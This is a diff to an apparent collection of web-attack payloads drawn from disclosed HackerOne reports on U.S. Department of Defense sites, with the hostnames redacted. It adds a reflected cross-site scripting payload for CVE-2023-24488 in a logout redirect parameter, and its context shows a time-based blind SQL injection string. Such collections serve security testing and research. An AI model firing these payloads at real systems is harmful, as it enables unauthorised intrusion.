@@ -1,6 +1,6 @@
 # U.S. Dept Of Defense
 
-224 payloads.
+225 payloads.
 
 ### `a1bb52f5`
 
@@ -1877,6 +1877,15 @@ https:/██████/0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.896
 ```
 
 — [Blind Sql Injection https:/████████](https://hackerone.com/reports/2020429) · U.S. Dept Of Defense · [codeslayer1337](https://hackerone.com/codeslayer1337)
+
+### `be1ceda9`
+
+```
+https://█████/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>
+```
+
+**Parameter:** `post_logout_redirect_uri`
+— [CVE-2023-24488 xss on https://██████/](https://hackerone.com/reports/2045549) · U.S. Dept Of Defense · [0xmaruf](https://hackerone.com/0xmaruf)
 
 ### `25f72612`
 
